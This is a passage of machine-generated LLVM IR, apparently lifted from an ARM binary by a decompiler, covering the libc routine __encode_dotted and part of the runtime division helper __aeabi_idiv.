  uselistorder i32 ()* @__GI___errno_location, { 49, 48, 60, 46, 45, 44, 43, 84, 83, 82, 34, 38, 59, 58, 81, 80, 77, 47, 33, 57, 56, 79, 78, 76, 75, 74, 73, 5, 40, 51, 17, 9, 72, 8, 22, 7, 16, 15, 14, 42, 41, 71, 70, 69, 39, 13, 12, 52, 21, 32, 31, 50, 11, 25, 28, 61, 27, 55, 54, 53, 68, 36, 35, 6, 2, 4, 37, 66, 10, 67, 0, 30, 3, 23, 65, 24, 29, 64, 63, 62, 19, 1, 18, 85, 26, 20 }
  uselistorder i32* @r7, { 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 153, 154, 155, 156, 157, 158, 159, 160, 167, 168, 169, 170, 171, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 21, 22, 23, 24, 0, 25, 2, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 78, 4, 79, 80, 81, 26, 27, 28, 29, 30, 31, 32, 33, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 82, 1, 83, 84, 85, 86, 5, 172, 173, 122, 6, 123, 124, 125, 126, 127, 128, 34, 35, 40, 41, 42, 43, 36, 37, 38, 39, 44, 45, 46, 47, 274, 275, 106, 107, 244, 245, 234, 235, 48, 236, 232, 233, 276, 277, 278, 279, 284, 285, 7, 16, 17, 49, 50, 3, 51, 15, 52, 53, 246, 247, 252, 253, 254, 255, 256, 257, 258, 248, 249, 250, 251, 161, 162, 163, 164, 165, 166, 259, 260, 261, 262, 263, 264, 265, 266, 8, 267, 268, 269, 219, 220, 270, 271, 228, 229, 68, 69, 223, 224, 225, 9, 226, 227, 87, 88, 89, 90, 91, 92, 93, 10, 179, 180, 174, 11, 175, 176, 177, 14, 178, 54, 12, 55, 56, 181, 13, 182, 183, 94, 95, 100, 101, 18, 19, 96, 97, 98, 99, 102, 103, 104, 105, 150, 151, 152, 237, 238, 282, 283, 57, 58, 272, 273, 108, 109, 280, 281, 230, 231, 59, 60, 221, 222, 61, 62, 63, 64, 65, 66, 67, 239, 240, 241, 242, 243, 70, 71, 72, 73, 74, 75, 76, 77, 20 }
  uselistorder label %dec_label_pc_1d914, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %v3_1d91c = load i32, i32* @r4, align 4
  store i32 %v3_1d91c, i32* %stack_var_-32, align 4
  %v6_1d91c = load i32, i32* @r5, align 4
  %v9_1d91c = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_1d924 = load i32, i32* @r1, align 4
  store i32 %v0_1d924, i32* %r8.global-to-local, align 4
  %v0_1d928 = load i32, i32* @r2, align 4
  store i32 %v0_1d928, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1d99023 = icmp slt i8* %arg1, null
  store i1 %v1_1d99023, i1* %cpsr_n.global-to-local, align 1
  %v2_1d99024 = icmp eq i8* %arg1, null
  store i1 %v2_1d99024, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1d99024, label %dec_label_pc_1d9a8, label %dec_label_pc_1d99c

dec_label_pc_1d934:                               ; preds = %dec_label_pc_1d99c
  %v2_1d934 = call i32 @__GI_strchr(i32 %v0_1d93426, i32 46)
  store i32 %v2_1d934, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1d938 = icmp slt i32 %v2_1d934, 0
  store i1 %v1_1d938, i1* %cpsr_n.global-to-local, align 1
  %v2_1d938 = icmp eq i32 %v2_1d934, 0
  store i1 %v2_1d938, i1* %cpsr_z.global-to-local, align 1
  %v0_1d93c = load i32, i32* @r4, align 4
  %v2_1d93c = sub i32 %v2_1d934, %v0_1d93c
  store i32 %v2_1d93c, i32* @r5, align 4
  br i1 %v2_1d938, label %dec_label_pc_1d944, label %dec_label_pc_1d950

dec_label_pc_1d944:                               ; preds = %dec_label_pc_1d934
  %v1_1d944 = inttoptr i32 %v0_1d93c to i8*
  %v3_1d948 = call i32 @strlen(i8* %v1_1d944)
  %sext = mul i32 %v3_1d948, 16777216
  %v1_1d94c = sdiv i32 %sext, 16777216
  store i32 %v1_1d94c, i32* @r5, align 4
  %v0_1d95c.pre = load i32, i32* @r4, align 4
  %v0_1d96c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1d950

dec_label_pc_1d950:                               ; preds = %dec_label_pc_1d934, %dec_label_pc_1d944
  %v0_1d96c = phi i32 [ %v2_1d934, %dec_label_pc_1d934 ], [ %v0_1d96c.pre, %dec_label_pc_1d944 ]
  %v0_1d95c = phi i32 [ %v0_1d93c, %dec_label_pc_1d934 ], [ %v0_1d95c.pre, %dec_label_pc_1d944 ]
  %v0_1d97c = phi i32 [ %v2_1d93c, %dec_label_pc_1d934 ], [ %v1_1d94c, %dec_label_pc_1d944 ]
  %v0_1d950 = load i32, i32* %sl.global-to-local, align 4
  %v1_1d950 = add i32 %v0_1d950, 1
  store i32 %v1_1d950, i32* %r7.global-to-local, align 4
  %v1_1d954 = load i32, i32* %sb.global-to-local, align 4
  %v2_1d954 = sub i32 %v1_1d954, %v0_1d950
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1d958 = icmp slt i32 %v0_1d97c, 0
  store i1 %v1_1d958, i1* %cpsr_n.global-to-local, align 1
  %v2_1d958 = icmp eq i32 %v0_1d97c, 0
  store i1 %v2_1d958, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_1d95c, i32* @r1, align 4
  %v0_1d960 = load i32, i32* %r8.global-to-local, align 4
  %v2_1d960 = add i32 %v0_1d960, %v1_1d950
  store i32 %v2_1d960, i32* @r0, align 4
  store i32 %v0_1d97c, i32* @r2, align 4
  %v1_1d968 = add i32 %v2_1d954, -1
  store i32 %v1_1d968, i32* @r3, align 4
  %v1_1d96c = add i32 %v0_1d96c, 1
  store i32 %v1_1d96c, i32* @r4, align 4
  br i1 %v2_1d958, label %dec_label_pc_1d9bc, label %dec_label_pc_1d974

dec_label_pc_1d974:                               ; preds = %dec_label_pc_1d950
  %v2_1d974 = sub i32 %v0_1d97c, %v1_1d968
  %v3_1d974 = icmp ult i32 %v0_1d97c, %v1_1d968
  %v4_1d974 = xor i32 %v1_1d968, %v0_1d97c
  %v5_1d974 = xor i32 %v2_1d974, %v0_1d97c
  %v6_1d974 = and i32 %v5_1d974, %v4_1d974
  %v7_1d974 = icmp slt i32 %v6_1d974, 0
  store i1 %v7_1d974, i1* %cpsr_v.global-to-local, align 1
  %v8_1d974 = icmp slt i32 %v2_1d974, 0
  store i1 %v8_1d974, i1* %cpsr_n.global-to-local, align 1
  %v9_1d974 = icmp eq i32 %v0_1d97c, %v1_1d968
  store i1 %v9_1d974, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1d974, label %dec_label_pc_1d97c, label %dec_label_pc_1d9bc

dec_label_pc_1d97c:                               ; preds = %dec_label_pc_1d974
  %v1_1d97c = trunc i32 %v0_1d97c to i8
  %v4_1d97c = add i32 %v0_1d960, %v0_1d950
  %v5_1d97c = inttoptr i32 %v4_1d97c to i8*
  store i8 %v1_1d97c, i8* %v5_1d97c, align 1
  %v0_1d980 = call i32 @memcpy()
  store i32 %v0_1d980, i32* @r0, align 4
  %v0_1d984 = load i32, i32* @r6, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1d984 = icmp slt i32 %v0_1d984, 0
  store i1 %v1_1d984, i1* %cpsr_n.global-to-local, align 1
  %v2_1d984 = icmp eq i32 %v0_1d984, 0
  store i1 %v2_1d984, i1* %cpsr_z.global-to-local, align 1
  %v0_1d988 = load i32, i32* @r5, align 4
  %v1_1d988 = load i32, i32* %r7.global-to-local, align 4
  %v2_1d988 = add i32 %v1_1d988, %v0_1d988
  store i32 %v2_1d988, i32* %sl.global-to-local, align 4
  br i1 %v2_1d984, label %dec_label_pc_1d9a8, label %dec_label_pc_1d97c.dec_label_pc_1d990_crit_edge

dec_label_pc_1d97c.dec_label_pc_1d990_crit_edge:  ; preds = %dec_label_pc_1d97c
  %v0_1d990.pre = load i32, i32* @r4, align 4
  store i32 %v0_1d990.pre, i32* @r0, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1d990 = icmp slt i32 %v0_1d990.pre, 0
  store i1 %v1_1d990, i1* %cpsr_n.global-to-local, align 1
  %v2_1d990 = icmp eq i32 %v0_1d990.pre, 0
  store i1 %v2_1d990, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1d990, label %dec_label_pc_1d9a8, label %dec_label_pc_1d99c

dec_label_pc_1d99c:                               ; preds = %entry, %dec_label_pc_1d97c.dec_label_pc_1d990_crit_edge
  %v0_1d93426 = phi i32 [ %v0_1d990.pre, %dec_label_pc_1d97c.dec_label_pc_1d990_crit_edge ], [ %tmp, %entry ]
  %v5_1d9b0525 = phi i32 [ %v2_1d988, %dec_label_pc_1d97c.dec_label_pc_1d990_crit_edge ], [ 0, %entry ]
  %v1_1d99c = inttoptr i32 %v0_1d93426 to i8*
  %v2_1d99c = load i8, i8* %v1_1d99c, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1d9a0 = icmp eq i8 %v2_1d99c, 0
  store i1 %v2_1d9a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1d9a0, label %dec_label_pc_1d9a8, label %dec_label_pc_1d934

dec_label_pc_1d9a8:                               ; preds = %dec_label_pc_1d97c.dec_label_pc_1d990_crit_edge, %dec_label_pc_1d97c, %dec_label_pc_1d99c, %entry
  %v8_1d9b4 = phi i32 [ 0, %entry ], [ %v5_1d9b0525, %dec_label_pc_1d99c ], [ %v2_1d988, %dec_label_pc_1d97c ], [ %v2_1d988, %dec_label_pc_1d97c.dec_label_pc_1d990_crit_edge ]
  %v0_1d9a8 = load i32, i32* %sb.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1d9a8 = icmp slt i32 %v0_1d9a8, 0
  store i1 %v1_1d9a8, i1* %cpsr_n.global-to-local, align 1
  %v2_1d9a8 = icmp eq i32 %v0_1d9a8, 0
  store i1 %v2_1d9a8, i1* %cpsr_z.global-to-local, align 1
  %tmp21 = icmp slt i32 %v0_1d9a8, 1
  br i1 %tmp21, label %bb22, label %bb

bb:                                               ; preds = %dec_label_pc_1d9a8
  %v6_1d9b0 = add i32 %v8_1d9b4, 1
  store i32 %v6_1d9b0, i32* @r0, align 4
  %v7_1d9b4 = load i32, i32* %r8.global-to-local, align 4
  %v9_1d9b4 = add i32 %v7_1d9b4, %v8_1d9b4
  %v10_1d9b4 = inttoptr i32 %v9_1d9b4 to i8*
  store i8 0, i8* %v10_1d9b4, align 1
  %v0_1d9b8.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_1d9b8.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1d9b8.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_1d9a8, %bb
  %v2_1d9b8 = phi i1 [ %v2_1d9b8.pre, %bb ], [ false, %dec_label_pc_1d9a8 ]
  %v1_1d9b8 = phi i1 [ %v1_1d9b8.pre, %bb ], [ %v1_1d9a8, %dec_label_pc_1d9a8 ]
  %v0_1d9b8 = phi i1 [ %v0_1d9b8.pre, %bb ], [ %v2_1d9a8, %dec_label_pc_1d9a8 ]
  %v3_1d9b8 = xor i1 %v2_1d9b8, %v1_1d9b8
  %v4_1d9b8 = or i1 %v0_1d9b8, %v3_1d9b8
  br i1 %v4_1d9b8, label %dec_label_pc_1d9bc, label %.dec_label_pc_1d9c0_crit_edge

.dec_label_pc_1d9c0_crit_edge:                    ; preds = %bb22
  %v1_1d9c4.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1d9c0

dec_label_pc_1d9bc:                               ; preds = %dec_label_pc_1d974, %dec_label_pc_1d950, %bb22
  br label %dec_label_pc_1d9c0

dec_label_pc_1d9c0:                               ; preds = %.dec_label_pc_1d9c0_crit_edge, %dec_label_pc_1d9bc
  %v1_1d9c4 = phi i32 [ %v1_1d9c4.pre, %.dec_label_pc_1d9c0_crit_edge ], [ -1, %dec_label_pc_1d9bc ]
  %v2_1d9c0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_1d9c0, i32* @r4, align 4
  store i32 %v6_1d91c, i32* @r5, align 4
  store i32 %v9_1d91c, i32* @r6, align 4
  ret i32 %v1_1d9c4

; uselistorder directives
  uselistorder i32 %v0_1d9a8, { 0, 2, 1 }
  uselistorder i32 %v0_1d990.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1d984, { 1, 0 }
  uselistorder i32 %v2_1d974, { 1, 0 }
  uselistorder i32 %v1_1d968, { 2, 0, 3, 1, 4 }
  uselistorder i32 %v0_1d97c, { 2, 4, 0, 1, 5, 3, 6, 7, 8 }
  uselistorder i32 %v1_1d94c, { 1, 0 }
  uselistorder i1 %v2_1d99024, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5, 8 }
  uselistorder i8 0, { 8, 47, 1, 2, 49, 48, 50, 3, 51, 30, 52, 10, 11, 53, 4, 54, 55, 57, 56, 33, 58, 34, 12, 60, 59, 13, 14, 15, 16, 17, 62, 61, 35, 63, 5, 64, 65, 66, 31, 32, 68, 69, 67, 71, 70, 36, 72, 18, 73, 74, 19, 75, 6, 76, 45, 77, 20, 21, 22, 23, 24, 25, 78, 79, 80, 81, 82, 37, 83, 84, 86, 87, 88, 89, 85, 26, 27, 0, 90, 91, 92, 28, 9, 94, 93, 29, 95, 96, 97, 38, 98, 99, 7, 100, 102, 39, 103, 104, 101, 105, 106, 107, 108, 110, 109, 111, 112, 113, 114, 115, 116, 117, 118, 120, 119, 122, 121, 123, 40, 125, 124, 46, 126, 41, 127, 129, 130, 128, 42, 131, 132, 44, 133, 43, 134, 135, 136, 137 }
  uselistorder i32 ()* @memcpy, { 17, 16, 15, 10, 9, 8, 7, 6, 5, 25, 4, 12, 24, 23, 0, 14, 13, 22, 21, 20, 11, 19, 18, 1, 3, 2 }
  uselistorder i32 (i8*)* @strlen, { 15, 13, 12, 11, 10, 9, 29, 28, 14, 19, 18, 17, 30, 27, 26, 25, 23, 24, 22, 21, 20, 8, 16, 33, 32, 31, 7, 6, 5, 3, 4, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 11, 7, 6, 5, 2, 1, 0, 10, 9, 8, 19, 18, 17, 16, 15, 14, 13, 12, 4, 3 }
  uselistorder i32 46, { 0, 1, 4, 5, 6, 7, 9, 8, 2, 3 }
  uselistorder label %dec_label_pc_1d9c0, { 1, 0 }
  uselistorder label %dec_label_pc_1d9bc, { 2, 0, 1 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_1d9a8, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1d99c, { 1, 0 }
  uselistorder label %dec_label_pc_1d950, { 1, 0 }
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %v0_1d9c8 = load i32, i32* @r1, align 4
  %v1_1d9c8 = icmp slt i32 %v0_1d9c8, 0
  %v2_1d9c8 = icmp eq i32 %v0_1d9c8, 0
  %v2_1d9cc = xor i32 %v0_1d9c8, %arg1
  br i1 %v2_1d9c8, label %dec_label_pc_1dae0, label %dec_label_pc_1d9d4

dec_label_pc_1d9d4:                               ; preds = %entry
  br i1 %v1_1d9c8, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_1d9d4
  %v2_1d9d4 = sub i32 0, %v0_1d9c8
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_1d9d4, %bb
  %v1_1daa0 = phi i32 [ %v2_1d9d4, %bb ], [ %v0_1d9c8, %dec_label_pc_1d9d4 ]
  %v1_1d9d8 = add i32 %v1_1daa0, -1
  %v7_1d9d8 = icmp eq i32 %v1_1daa0, 1
  br i1 %v7_1d9d8, label %dec_label_pc_1da80, label %dec_label_pc_1d9e0

dec_label_pc_1d9e0:                               ; preds = %thread-pre-split
  %v1_1d9e0 = icmp slt i32 %arg1, 0
  br i1 %v1_1d9e0, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_1d9e0
  %v2_1d9e4 = sub i32 0, %arg1
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_1d9e0, %bb85
  %v0_1dad4 = phi i32 [ %arg1, %dec_label_pc_1d9e0 ], [ %v2_1d9e4, %bb85 ]
  %v3_1d9e8 = icmp uge i32 %v0_1dad4, %v1_1daa0
  %v9_1d9e8 = icmp eq i32 %v0_1dad4, %v1_1daa0
  %v2_1d9ec = xor i1 %v3_1d9e8, true
  %v3_1d9ec = or i1 %v9_1d9e8, %v2_1d9ec
  br i1 %v3_1d9ec, label %dec_label_pc_1da8c, label %dec_label_pc_1d9f0

dec_label_pc_1d9f0:                               ; preds = %bb86
  %v2_1d9f0 = and i32 %v1_1d9d8, %v1_1daa0
  %v4_1d9f0 = icmp eq i32 %v2_1d9f0, 0
  br i1 %v4_1d9f0, label %dec_label_pc_1da9c, label %dec_label_pc_1d9f8

dec_label_pc_1d9f8:                               ; preds = %dec_label_pc_1d9f0
  %v3_1d9f8 = icmp ult i32 %v1_1daa0, 536870912
  br i1 %v3_1d9f8, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_1d9f8
  %v4_1d9fc = mul i32 %v1_1daa0, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_1d9f8, %.thread
  %v0_1da1c.pr40.ph = phi i32 [ %v4_1d9fc, %.thread ], [ %v1_1daa0, %dec_label_pc_1d9f8 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_1d9f8 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_1da1c.pr40 = phi i32 [ %v4_1da10, %bb89 ], [ %v0_1da1c.pr40.ph, %.preheader.preheader ]
  %v1_1da14 = phi i32 [ %v4_1da14, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_1da08 = icmp ugt i32 %v0_1da1c.pr40, 268435455
  br i1 %v2_1da08, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_1da1cthread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_1da0c = icmp ult i32 %v0_1da1c.pr40, %v0_1dad4
  br i1 %v4_1da0c, label %bb88, label %dec_label_pc_1da1cthread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_1da10 = and i32 %v0_1da1c.pr40, 268435456
  %v3_1da10 = icmp eq i32 %v2_1da10, 0
  %v4_1da10 = mul i32 %v0_1da1c.pr40, 16
  br i1 %v3_1da10, label %bb89, label %dec_label_pc_1da1c.loopexit

bb89:                                             ; preds = %bb88
  %v2_1da14 = and i32 %v1_1da14, 268435456
  %v3_1da14 = icmp eq i32 %v2_1da14, 0
  %v4_1da14 = mul i32 %v1_1da14, 16
  br i1 %v3_1da14, label %.preheader, label %dec_label_pc_1da1cthread-pre-split.loopexit.loopexit

dec_label_pc_1da1cthread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_1da2852.ph = phi i32 [ %v1_1da14, %bb87 ], [ %v4_1da14, %bb89 ]
  %v0_1da1c.pr42.ph = phi i32 [ %v0_1da1c.pr40, %bb87 ], [ %v4_1da10, %bb89 ]
  br label %dec_label_pc_1da1cthread-pre-split.loopexit

dec_label_pc_1da1cthread-pre-split.loopexit:      ; preds = %dec_label_pc_1da1cthread-pre-split.loopexit.loopexit, %.thread3
  %v1_1da2852 = phi i32 [ %v1_1da14, %.thread3 ], [ %v1_1da2852.ph, %dec_label_pc_1da1cthread-pre-split.loopexit.loopexit ]
  %v0_1da1c.pr42 = phi i32 [ %v0_1da1c.pr40, %.thread3 ], [ %v0_1da1c.pr42.ph, %dec_label_pc_1da1cthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_1da1cthread-pre-split

dec_label_pc_1da1cthread-pre-split:               ; preds = %dec_label_pc_1da1cthread-pre-split.loopexit, %bb91
  %v1_1da2850 = phi i32 [ %v1_1da2852, %dec_label_pc_1da1cthread-pre-split.loopexit ], [ %v3_1da28, %bb91 ]
  %v2_1da2048 = phi i32 [ %v0_1dad4, %dec_label_pc_1da1cthread-pre-split.loopexit ], [ %v2_1da20, %bb91 ]
  %v0_1da1c.pr = phi i32 [ %v0_1da1c.pr42, %dec_label_pc_1da1cthread-pre-split.loopexit ], [ %v3_1da24, %bb91 ]
  br label %dec_label_pc_1da1c

dec_label_pc_1da1c.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_1da1c

dec_label_pc_1da1c:                               ; preds = %dec_label_pc_1da1c.loopexit, %dec_label_pc_1da1cthread-pre-split
  %v1_1da28 = phi i32 [ %v1_1da2850, %dec_label_pc_1da1cthread-pre-split ], [ %v1_1da14, %dec_label_pc_1da1c.loopexit ]
  %v2_1da20 = phi i32 [ %v2_1da2048, %dec_label_pc_1da1cthread-pre-split ], [ %v0_1dad4, %dec_label_pc_1da1c.loopexit ]
  %v1_1da24 = phi i32 [ %v0_1da1c.pr, %dec_label_pc_1da1cthread-pre-split ], [ %v4_1da10, %dec_label_pc_1da1c.loopexit ]
  %v2_1da1c = icmp slt i32 %v1_1da24, 0
  br i1 %v2_1da1c, label %dec_label_pc_1da30, label %bb90

bb90:                                             ; preds = %dec_label_pc_1da1c
  %v4_1da20 = icmp ult i32 %v1_1da24, %v2_1da20
  br i1 %v4_1da20, label %bb91, label %dec_label_pc_1da30

bb91:                                             ; preds = %bb90
  %v3_1da24 = mul i32 %v1_1da24, 2
  %v2_1da28 = icmp slt i32 %v1_1da28, 0
  %v3_1da28 = mul i32 %v1_1da28, 2
  br i1 %v2_1da28, label %dec_label_pc_1da30, label %dec_label_pc_1da1cthread-pre-split

dec_label_pc_1da30:                               ; preds = %bb90, %dec_label_pc_1da1c, %bb91
  %v2_1da3c63 = phi i32 [ %v3_1da28, %bb91 ], [ %v1_1da28, %bb90 ], [ %v1_1da28, %dec_label_pc_1da1c ]
  %v1_1da3455 = phi i32 [ %v3_1da24, %bb91 ], [ %v1_1da24, %bb90 ], [ %v1_1da24, %dec_label_pc_1da1c ]
  br label %dec_label_pc_1da34

dec_label_pc_1da34:                               ; preds = %.thread13, %dec_label_pc_1da30
  %v1_1da68 = phi i32 [ %v4_1da68, %.thread13 ], [ %v2_1da3c63, %dec_label_pc_1da30 ]
  %v1_1da3c = phi i32 [ %v1_1da78, %.thread13 ], [ 0, %dec_label_pc_1da30 ]
  %v1_1da6c = phi i32 [ %v4_1da6c, %.thread13 ], [ %v1_1da3455, %dec_label_pc_1da30 ]
  %v1_1da38 = phi i32 [ %v0_1da64, %.thread13 ], [ %v0_1dad4, %dec_label_pc_1da30 ]
  %v3_1da34 = icmp ult i32 %v1_1da38, %v1_1da6c
  br i1 %v3_1da34, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_1da34
  %v3_1da38 = sub i32 %v1_1da38, %v1_1da6c
  %v3_1da3c = or i32 %v1_1da3c, %v1_1da68
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1da34, %bb92
  %v1_1da44 = phi i32 [ %v1_1da38, %dec_label_pc_1da34 ], [ %v3_1da38, %bb92 ]
  %v1_1da48 = phi i32 [ %v1_1da3c, %dec_label_pc_1da34 ], [ %v3_1da3c, %bb92 ]
  %v4_1da40 = udiv i32 %v1_1da6c, 2
  %v6_1da40 = icmp ult i32 %v1_1da44, %v4_1da40
  br i1 %v6_1da40, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_1da44 = urem i32 %v1_1da6c, 2
  %v4_1da44 = icmp eq i32 %v3_1da44, 0
  %v6_1da44 = sub i32 %v1_1da44, %v4_1da40
  br i1 %v4_1da44, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_1da48 = udiv i32 %v1_1da68, 2
  %v6_1da48 = or i32 %v1_1da48, %v5_1da48
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_1da50 = phi i32 [ %v6_1da44, %bb93 ], [ %v1_1da44, %.thread8 ], [ %v6_1da44, %bb94 ]
  %v1_1da54 = phi i32 [ %v1_1da48, %bb93 ], [ %v1_1da48, %.thread8 ], [ %v6_1da48, %bb94 ]
  %v4_1da4c = udiv i32 %v1_1da6c, 4
  %v6_1da4c = icmp ult i32 %v1_1da50, %v4_1da4c
  br i1 %v6_1da4c, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_1da50 = and i32 %v1_1da6c, 2
  %v4_1da50 = icmp eq i32 %v3_1da50, 0
  %v6_1da50 = sub i32 %v1_1da50, %v4_1da4c
  br i1 %v4_1da50, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_1da54 = udiv i32 %v1_1da68, 4
  %v6_1da54 = or i32 %v1_1da54, %v5_1da54
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_1da5c = phi i32 [ %v6_1da50, %bb95 ], [ %v1_1da50, %.thread9 ], [ %v6_1da50, %bb96 ]
  %v1_1da60 = phi i32 [ %v1_1da54, %bb95 ], [ %v1_1da54, %.thread9 ], [ %v6_1da54, %bb96 ]
  %v4_1da58 = udiv i32 %v1_1da6c, 8
  %v6_1da58 = icmp ult i32 %v1_1da5c, %v4_1da58
  br i1 %v6_1da58, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_1da5c = and i32 %v1_1da6c, 4
  %v4_1da5c = icmp eq i32 %v3_1da5c, 0
  %v6_1da5c = sub i32 %v1_1da5c, %v4_1da58
  br i1 %v4_1da5c, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_1da60 = udiv i32 %v1_1da68, 8
  %v6_1da60 = or i32 %v1_1da60, %v5_1da60
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_1da78 = phi i32 [ %v1_1da60, %bb97 ], [ %v1_1da60, %.thread10 ], [ %v6_1da60, %bb98 ]
  %v0_1da64 = phi i32 [ %v6_1da5c, %bb97 ], [ %v1_1da5c, %.thread10 ], [ %v6_1da5c, %bb98 ]
  %v2_1da64 = icmp eq i32 %v0_1da64, 0
  br i1 %v2_1da64, label %dec_label_pc_1da74, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_1da68, 16
  br i1 %tmp, label %dec_label_pc_1da74, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_1da68 = udiv i32 %v1_1da68, 16
  %v4_1da6c = udiv i32 %v1_1da6c, 16
  br label %dec_label_pc_1da34

dec_label_pc_1da74:                               ; preds = %thread-pre-split12, %bb99
  %v1_1da74 = icmp slt i32 %v2_1d9cc, 0
  br i1 %v1_1da74, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_1da74
  %v2_1da78 = sub i32 0, %v1_1da78
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_1da80, %dec_label_pc_1da74, %bb100
  %v1_1da7c = phi i32 [ %v1_1da78, %dec_label_pc_1da74 ], [ %v2_1da78, %bb100 ], [ %arg1, %dec_label_pc_1da80 ], [ %v2_1da84, %bb101 ], [ %v1_1da9880, %bb103 ], [ %v2_1da94, %bb104 ]
  ret i32 %v1_1da7c

dec_label_pc_1da80:                               ; preds = %thread-pre-split
  br i1 %v1_1d9c8, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_1da80
  %v2_1da84 = sub i32 0, %arg1
  br label %.thread16

dec_label_pc_1da8c:                               ; preds = %bb86
  br i1 %v3_1d9e8, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_1da8c
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_1da8c, %bb102
  %v1_1da9880 = phi i32 [ %arg1, %dec_label_pc_1da8c ], [ 0, %bb102 ]
  br i1 %v9_1d9e8, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_1da90 = ashr i32 %v2_1d9cc, 31
  %v2_1da94 = or i32 %v4_1da90, 1
  br label %.thread16

dec_label_pc_1da9c:                               ; preds = %dec_label_pc_1d9f0
  %v2_1da9c = icmp ugt i32 %v1_1daa0, 65535
  br i1 %v2_1da9c, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_1da9c
  %v2_1daa0 = and i32 %v1_1daa0, 32768
  %v3_1daa0 = icmp eq i32 %v2_1daa0, 0
  %v4_1daa0 = udiv i32 %v1_1daa0, 65536
